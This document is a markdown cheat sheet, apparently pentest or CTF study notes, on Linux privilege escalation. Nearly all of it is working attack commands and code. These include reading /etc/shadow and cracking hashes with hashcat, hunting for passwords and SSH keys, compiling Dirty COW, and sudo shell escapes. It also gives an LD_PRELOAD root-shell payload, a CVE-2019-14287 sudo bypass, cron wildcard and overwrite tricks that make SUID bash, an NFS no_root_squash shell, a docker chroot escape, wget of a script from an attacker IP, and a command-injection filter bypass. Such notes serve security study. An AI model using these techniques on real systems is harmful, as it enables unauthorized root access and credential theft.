# Initial Enumeration and Automated Tools

1. [System Enumeration](#system-enumeration)
2. [User Enumeration](#user-enumeration)
3. [Network Enumeration](#network-enumeration)
4. [Password Hunting](#password-hunting)
5. [Automated Enumeration Tools](#automated-enumeration-tools)

## System Enumeration

```shell
hostname

uname -a
#kernel info. Helpful to identify kernal exploit

cat /proc/version

cat /etc/issue
#distro info

lscpu
#cpu info

ps aux
#services running

ps aux | grep root
#check processes running as root
```

## User Enumeration

```shell
whoami

id
# uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

sudo -l
#view commands that can be run as sudo

cat /etc/passwd

cat /etc/passwd | cut -d : -f 1
#get users

cat /etc/shadow

cat /etc/group

history
```

## Network Enumeration

```shell
ip a s

ip route

ip neigh
#arp tables

netstat -ano
#check open ports
```

## Password Hunting

```shell
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2>/dev/null
#we can search for any string
#it takes time so choose string carefully

locate password | more
#check for filenames with the term 'password'

find / -name authorized_keys 2>/dev/null
#looking for SSH keys
find / -name id_rsa 2>/dev/null
```

## Automated Enumeration Tools

* [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

* [LinEnum](https://github.com/rebootuser/LinEnum)

* [Linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester)

* [Linux priv checker](https://github.com/sleventyeleven/linuxprivchecker)

```shell
./linpeas.sh
#complete basic enum

./linux-exploit-suggester.sh
#shows CVEs
```

## Kernel Exploits
```shell
# import the script from : https://github.com/firefart/dirtycow/blob/master/dirty.c
# Compile it
gcc -pthread c0w.c -o cow
gcc -pthread <FILE_NAME> -o <FILE_NAME>
./cow
passwd
id
# uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

##  Passwords & File Permissions
```shell
# Finding creds in files or bash_history
history
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
locate password | more
# or utilize linpeas script to discover creds

# File permissions
# Note: Keep your eyes open on shadow file premissions. As if you can modify that file you can do a lot of malic stuff!!
# /etc/passwd: can be read by anyone
# /etc/shadow: can be read by only root, not regular user

# 1- cat /etc/passwd  --------> save the output in a new file <passwd>
# 2- cat /etc/shadow  --------> save the output in a new file <shadow>
# 3-  unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
# 4- hashcat -m 1800 shadowed.txt /home/kali/Desktop/rockyou/rockyou.txt -O

# SSH key
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

## Sudo
# via Sudo Shell Escaping
```shell
# https://gtfobins.github.io/gtfobins
sudo -l
#      (root) NOPASSWD: /usr/sbin/iftop
#      (root) NOPASSWD: /usr/bin/find
#      (root) NOPASSWD: /usr/bin/nano
#      (root) NOPASSWD: /usr/bin/vim
#      (root) NOPASSWD: /usr/bin/man
#      (root) NOPASSWD: /usr/bin/awk
#      (root) NOPASSWD: /usr/bin/less
#      (root) NOPASSWD: /usr/bin/ftp
#      (root) NOPASSWD: /usr/bin/nmap
#      (root) NOPASSWD: /usr/sbin/apache2
#      (root) NOPASSWD: /bin/more

#  Notice the list of programs that can run via sudo. Now utilize one of these to escape shell and be root

sudo vim -c ':!/bin/sh'
# Now you are root user!
```

##  Sudo (LD_PRELOAD)
```shell
# 1. In command prompt type: sudo -l
# 2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

# 1. Open a text editor and type:

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# 2. Save the file as x.c
# 3. In command prompt type:
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
# 4. In command prompt type:
sudo LD_PRELOAD=/tmp/x.so apache2
# 5. In command prompt type: id
```

## CVE-2019-14287
```shell
sudo -l

user ALL=(ALL, !root) /bin/bash = user cannot execute /bin/bash

sudo -u#-1 /bin/bash
whoami
root
```

## CVE-2019-18634
![image](https://github.com/user-attachments/assets/671e273c-f082-47b4-89b4-44dd7e9ceabb)

```shell
# In older machines, if pwfeedback is enable = asterisc appers when you type passwords we can use an exploit to escalate that
cat /etc/sudoers
sudo -l
sudo -V
```

## SUID
Notes:
  1. If we have an upload file directory, but it does not accept php files we can send to burp and fuzz the extension, to find an alternative, like php3,php4, phtml, etc 
  2. Go to gtfobins if u find a file with SUID access
```shell
find / -perm -u=s -type f 2>/dev/null
```

## Capability
```shell
getcap -r / 2>/dev/null
# /usr/bin/python2.6 = cap_setuid+ep

/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# now you are root
```

## Escalation via Cron Paths
If the crontab is executing a file, go to your $PATH variable to see which path u have access. in case u have access in any dir, lets go make something malicious to trick the crontab, to run our file
This script need to be ajusted before using
![image](https://github.com/user-attachments/assets/370bdba3-1546-4a46-a78e-c68b50c85565)

```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
/tmp/bash -p
# Now you are root
```

## Escalations via Cron Wildcards
![image](https://github.com/user-attachments/assets/b59e7655-edf8-4a63-9351-326506982b44)

```shell
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh
chmod +s runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\runme.sh
# wait crontab to execute
/tmp/bash -p
```

## Cron file overwrite
If we have privileges to write a file thats running by root in crontab, we just echo something malicious and wait
```shell
cat /etc/crontab

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /file/overwrite.sh
# wait crontab
/tmp/bash -p

```

##  NFS Root Squashing
![image](https://github.com/user-attachments/assets/f4690e23-5a21-4f77-9210-2900a52c1a69)
It means that the /tmp folder is shareable and can be mounted and everything inside the mount gonna be run by root, so we can take advantage of that.
```shell
cat /etc/exports
# output example=/tmp *(rw,sync,insecure,"no_root_squash",no_subtree_check)

# in kali
showmount -e <target ip>

mkdir /tmp/mountme
mount -o rw,vers=2 <target ip>:/tmp /tmp/mountme

# Now we put something malicious in the mounted folder
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/malicious.c

gcc /tmp/mountme/malicious.c -o /tmp/mountme/shell
chmod +s /tmp/mountme/shell

# From the target machine
cd /tmp
./shell
root

```

## Docker
![image](https://github.com/user-attachments/assets/32b09a20-8ca1-4fc8-8702-bd914f5ef9d5)

```shell
# run linpeas or linenum in the victim machine "You have a low level user shell on the victim machine"
# if you saw the same msg as in the image run the following command
docker run -v /:/mnt --rm -it bash chroot /mnt sh

```

## Tips
1- If you are not finding directories, perhaps u should look for subdomains.
```shell 
wfuzz -c -f sub-fighter -w <wordlist> -u <url> -H "Host: FUZZ.target.com" --hw 290 (exclude 290 errors)

```
2- To download a shell/script or anything in victim machine
```shell
# In kali machine
python3 -m http.server 80

# In victim linux machine: try drop it in an writable folder such as temp
cd /temp
wget http://10.4.93.125:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

```
3- Backticks (`) have the highest preference in a command.
4- In command injection, if space()is being filtered, use ${IFS}.
